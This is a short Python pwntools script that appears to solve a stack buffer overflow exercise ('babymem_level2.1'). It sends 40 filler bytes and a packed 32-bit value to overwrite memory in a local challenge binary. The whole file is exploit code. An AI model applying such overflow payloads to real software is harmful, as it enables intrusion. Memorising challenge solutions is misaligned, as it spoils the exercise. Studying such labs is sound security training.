from pwn import *

p = process('/challenge/babymem_level2.1')

p.recvuntil('Payload size:')
p.sendline(b'44')

payload = b'a' * 40 + p32(0x7b2b4820) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

